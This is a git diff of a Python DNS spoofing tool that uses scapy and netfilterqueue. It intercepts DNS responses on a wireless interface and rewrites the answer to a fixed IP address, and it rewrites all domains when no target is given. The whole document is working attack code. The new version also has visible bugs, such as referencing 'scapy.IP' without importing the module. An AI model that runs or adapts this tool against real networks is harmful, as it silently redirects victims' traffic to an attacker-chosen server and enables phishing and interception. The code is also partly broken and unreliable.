@@ -1,6 +1,7 @@
 from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP
+import netfilterqueue
 
-def dns_response(packet, interface, victim_webserver, redirected_webserver):
+'''def dns_response(packet, interface, redirected_webserver, victim_webserver = None):
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Check if it's a DNS query
         # Extract the DNS query details
         dns_query = packet.getlayer(DNS)
@@ -11,7 +12,7 @@ def dns_response(packet, interface, victim_webserver, redirected_webserver):
 
         print("got DNS packet")
         
-        if victim_webserver in dns_qname.decode():
+        if victim_webserver in dns_qname.decode() or victim_webserver is None:
             # Create DNS response packet
             dns_response = DNS(
                 id=dns_id,
@@ -38,12 +39,52 @@ def dns_response(packet, interface, victim_webserver, redirected_webserver):
             send(response_packet, verbose=0, iface=interface)
             print("Sent forged packet")
         else:
-            print("Not important")
+            print("Not important")'''
 
-def dns_attack(interface, victim_webserver, redirected_webserver):
-    bpf_filter = 'udp and port 53'
+redirected_webserver = "131.155.194.237"
+victim_webserver = None
 
-    sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, interface, victim_webserver, redirected_webserver), iface = interface)
+def dns_response(pkt):#, interface, redirected_webserver, victim_webserver = None):
+    packet = scapy.IP(pkt.get_payload())
+    print("Got packet")
+    if packet.haslayer(scapy.DNSRR):
+        print("Got DNS response packet")
+        qname = packet[scapy.DNSQR].qname
+
+        if victim_webserver in qname.decode() or victim_webserver is None:
+            packet[scapy.DNSRR].rdata = redirected_webserver
+            
+            del packet[scapy.IP].len
+            del packet[scapy.IP].chksum
+            del packet[scapy.UDP].len
+            del packet[scapy.UDP].chksum
+
+            pkt.set_payload(bytes(packet))
+            print("DNS packet was modified")
+    
+    pkt.accept()
+    print("Packet forwarded")
+
+def dns_attack(interface, redirected_webserver, victim_webserver = None):
+    #bpf_filter = 'udp and port 53'
+    
+    #sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver), iface = interface)
+    queue = netfilterqueue.NetfilterQueue()
+
+    # Bind the queue to the nfqueue subsystem, specify the callback function
+    queue.bind(0, dns_response)
+
+    try:
+        # Run the queue
+        queue.run()
+    except KeyboardInterrupt:
+        # Exit gracefully on Ctrl+C
+        print("[+] User interrupted.")
+        # Flush the IP tables
+        queue.unbind()
+
+    
+
 
 if __name__ == '__main__':
-    dns_attack("wlp0s20f3", "google.it", "10.20.30.4")
+    dns_attack("wlp0s20f3", "131.155.194.237")
